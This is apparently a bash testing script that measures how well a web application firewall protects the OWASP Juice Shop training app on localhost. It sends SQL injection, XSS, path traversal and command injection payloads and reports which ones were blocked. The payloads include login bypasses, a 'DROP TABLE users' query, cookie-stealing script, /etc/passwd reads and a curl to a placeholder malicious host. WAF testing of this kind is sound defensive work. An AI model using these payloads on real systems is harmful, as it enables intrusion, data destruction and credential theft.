#!/bin/bash
#
# OWASP Juice Shop WAF Testing Script (Bash version)
# Tests WAF effectiveness against common exploit payloads
#

WAF_URL="http://localhost:8080"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_DIR="./test_results"
REPORT_FILE="$OUTPUT_DIR/waf_test_report_$TIMESTAMP.txt"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Counters
TOTAL=0
BLOCKED=0
BYPASSED=0
FAILED=0

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Initialize report
echo "=====================================" > "$REPORT_FILE"
echo "WAF Test Report - $TIMESTAMP" >> "$REPORT_FILE"
echo "=====================================" >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"

# Test function
test_payload() {
    local category="$1"
    local name="$2"
    local method="$3"
    local endpoint="$4"
    local payload="$5"
    
    TOTAL=$((TOTAL + 1))
    
    if [ "$method" = "GET" ]; then
        response=$(curl -s -w "\n%{http_code}" "$WAF_URL$endpoint?$payload" 2>&1)
    else
        response=$(curl -s -w "\n%{http_code}" -X POST \
            -H "Content-Type: application/json" \
            -d "$payload" \
            "$WAF_URL$endpoint" 2>&1)
    fi
    
    http_code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | head -n-1)
    
    # Check if blocked
    if [ "$http_code" = "403" ] || [ "$http_code" = "429" ]; then
        echo -e "  ${GREEN}✓ BLOCKED${NC} $name (HTTP $http_code)"
        echo "  ✓ BLOCKED $name (HTTP $http_code)" >> "$REPORT_FILE"
        BLOCKED=$((BLOCKED + 1))
    elif echo "$body" | grep -qi "blocked\|forbidden"; then
        echo -e "  ${GREEN}✓ BLOCKED${NC} $name (Block page detected)"
        echo "  ✓ BLOCKED $name (Block page detected)" >> "$REPORT_FILE"
        BLOCKED=$((BLOCKED + 1))
    elif [ "$http_code" = "200" ]; then
        # Check if exploit succeeded based on category
        if [ "$category" = "sqli" ] && echo "$body" | grep -qi "token\|authentication"; then
            echo -e "  ${RED}✗ BYPASSED${NC} $name (SQLi successful)"
            echo "  ✗ BYPASSED $name (SQLi successful)" >> "$REPORT_FILE"
            BYPASSED=$((BYPASSED + 1))
        elif [ "$category" = "xss" ] && echo "$body" | grep -q "<script\|alert("; then
            echo -e "  ${RED}✗ BYPASSED${NC} $name (XSS reflected)"
            echo "  ✗ BYPASSED $name (XSS reflected)" >> "$REPORT_FILE"
            BYPASSED=$((BYPASSED + 1))
        else
            echo -e "  ${YELLOW}○ FAILED${NC} $name (Passed WAF but exploit failed)"
            echo "  ○ FAILED $name (Passed WAF but exploit failed)" >> "$REPORT_FILE"
            FAILED=$((FAILED + 1))
        fi
    else
        echo -e "  ${YELLOW}○ FAILED${NC} $name (HTTP $http_code)"
        echo "  ○ FAILED $name (HTTP $http_code)" >> "$REPORT_FILE"
        FAILED=$((FAILED + 1))
    fi
    
    sleep 0.1  # Rate limiting
}

# Header
echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}OWASP Juice Shop WAF Testing Suite${NC}"
echo -e "${BLUE}============================================================${NC}"
echo ""

# Check WAF connectivity
echo -n "Checking WAF connectivity... "
if curl -s -f "$WAF_URL/rest/admin/application-version" > /dev/null 2>&1; then
    echo -e "${GREEN}✓ WAF is reachable${NC}"
else
    echo -e "${RED}✗ Cannot reach WAF${NC}"
    exit 1
fi
echo ""

# ============================================
# SQL Injection Tests
# ============================================
echo -e "${BLUE}=== Testing SQL Injection ===${NC}"
echo "=== SQL Injection Tests ===" >> "$REPORT_FILE"

test_payload "sqli" "Login Bypass - Classic" "POST" "/rest/user/login" \
    '{"email":"admin'\''--","password":"anything"}'

test_payload "sqli" "Login Bypass - OR 1=1" "POST" "/rest/user/login" \
    '{"email":"'\'' OR 1=1--","password":""}'

test_payload "sqli" "Login Bypass - UNION" "POST" "/rest/user/login" \
    '{"email":"'\'' UNION SELECT * FROM users--","password":"test"}'

test_payload "sqli" "Search UNION" "GET" "/rest/products/search" \
    "q=' UNION SELECT null, version(), null--"

test_payload "sqli" "Search Sleep" "GET" "/rest/products/search" \
    "q=' AND SLEEP(5)--"

test_payload "sqli" "Boolean-based" "GET" "/rest/products/search" \
    "q=' AND 1=1--"

test_payload "sqli" "Error-based" "GET" "/rest/products/search" \
    "q=' AND extractvalue(1,concat(0x7e,version()))--"

test_payload "sqli" "Stacked queries" "GET" "/rest/products/search" \
    "q='; DROP TABLE users--"

test_payload "sqli" "Time-based blind" "GET" "/rest/products/search" \
    "q=' OR BENCHMARK(1000000,MD5(1))--"

test_payload "sqli" "PostgreSQL sleep" "GET" "/rest/products/search" \
    "q='; SELECT pg_sleep(5)--"

echo "" >> "$REPORT_FILE"

# ============================================
# XSS Tests
# ============================================
echo ""
echo -e "${BLUE}=== Testing XSS ===${NC}"
echo "=== XSS Tests ===" >> "$REPORT_FILE"

test_payload "xss" "Basic Script Tag" "GET" "/rest/products/search" \
    "q=<script>alert('XSS')</script>"

test_payload "xss" "IMG onerror" "GET" "/rest/products/search" \
    "q=<img src=x onerror=alert('XSS')>"

test_payload "xss" "SVG onload" "GET" "/rest/products/search" \
    "q=<svg onload=alert('XSS')>"

test_payload "xss" "Iframe javascript" "GET" "/rest/products/search" \
    "q=<iframe src=\"javascript:alert('XSS')\">"

test_payload "xss" "Event handler" "GET" "/rest/products/search" \
    "q=<body onload=alert('XSS')>"

test_payload "xss" "Encoded script" "GET" "/rest/products/search" \
    "q=%3Cscript%3Ealert('XSS')%3C/script%3E"

test_payload "xss" "DOM XSS" "GET" "/rest/products/search" \
    "q=javascript:alert(document.cookie)"

test_payload "xss" "HTML Entity" "GET" "/rest/products/search" \
    "q=&lt;script&gt;alert('XSS')&lt;/script&gt;"

echo "" >> "$REPORT_FILE"

# ============================================
# Path Traversal Tests
# ============================================
echo ""
echo -e "${BLUE}=== Testing Path Traversal ===${NC}"
echo "=== Path Traversal Tests ===" >> "$REPORT_FILE"

test_payload "path-traversal" "Basic traversal" "GET" "/ftp/../../../etc/passwd" ""

test_payload "path-traversal" "URL encoded" "GET" "/ftp/..%2f..%2f..%2fetc%2fpasswd" ""

test_payload "path-traversal" "Double encoded" "GET" "/ftp/..%252f..%252fetc%252fpasswd" ""

test_payload "path-traversal" "Windows path" "GET" "/ftp/..\\..\\..\\windows\\win.ini" ""

test_payload "path-traversal" "Null byte" "GET" "/ftp/../../../etc/passwd%00.txt" ""

echo "" >> "$REPORT_FILE"

# ============================================
# Command Injection Tests
# ============================================
echo ""
echo -e "${BLUE}=== Testing Command Injection ===${NC}"
echo "=== Command Injection Tests ===" >> "$REPORT_FILE"

test_payload "rce" "Semicolon ls" "GET" "/rest/products/search" \
    "q=; ls -la"

test_payload "rce" "Pipe whoami" "GET" "/rest/products/search" \
    "q=| whoami"

test_payload "rce" "Backtick cat" "GET" "/rest/products/search" \
    "q=\`cat /etc/passwd\`"

test_payload "rce" "Dollar subshell" "GET" "/rest/products/search" \
    "q=\$(cat /etc/passwd)"

test_payload "rce" "Ampersand background" "GET" "/rest/products/search" \
    "q=& curl malicious.com &"

echo "" >> "$REPORT_FILE"

# ============================================
# Generate Summary
# ============================================
echo ""
echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}=== WAF Test Results ===${NC}"
echo -e "${BLUE}============================================================${NC}"
echo ""

BLOCKED_PCT=$(awk "BEGIN {printf \"%.1f\", ($BLOCKED/$TOTAL)*100}")
BYPASSED_PCT=$(awk "BEGIN {printf \"%.1f\", ($BYPASSED/$TOTAL)*100}")
FAILED_PCT=$(awk "BEGIN {printf \"%.1f\", ($FAILED/$TOTAL)*100}")

echo "Total Tests:       $TOTAL"
echo -e "${GREEN}Blocked:           $BLOCKED ($BLOCKED_PCT%)${NC}"
echo -e "${RED}Bypassed:          $BYPASSED ($BYPASSED_PCT%)${NC}"
echo -e "${YELLOW}Failed Exploits:   $FAILED ($FAILED_PCT%)${NC}"

echo "" >> "$REPORT_FILE"
echo "=====================================" >> "$REPORT_FILE"
echo "Summary" >> "$REPORT_FILE"
echo "=====================================" >> "$REPORT_FILE"
echo "Total Tests:       $TOTAL" >> "$REPORT_FILE"
echo "Blocked:           $BLOCKED ($BLOCKED_PCT%)" >> "$REPORT_FILE"
echo "Bypassed:          $BYPASSED ($BYPASSED_PCT%)" >> "$REPORT_FILE"
echo "Failed Exploits:   $FAILED ($FAILED_PCT%)" >> "$REPORT_FILE"

echo ""
echo -e "${GREEN}Report saved to: $REPORT_FILE${NC}"
echo ""

# Recommendations
echo -e "${BLUE}=== Recommendations ===${NC}"
echo ""

if [ "$BLOCKED_PCT" \< "80" ]; then
    echo -e "${RED}⚠ Detection rate is below 80% - Review and strengthen WAF rules${NC}"
elif [ "$BLOCKED_PCT" \< "90" ]; then
    echo -e "${YELLOW}⚠ Detection rate is good but could be improved${NC}"
else
    echo -e "${GREEN}✓ Detection rate is excellent (>90%)${NC}"
fi

echo ""
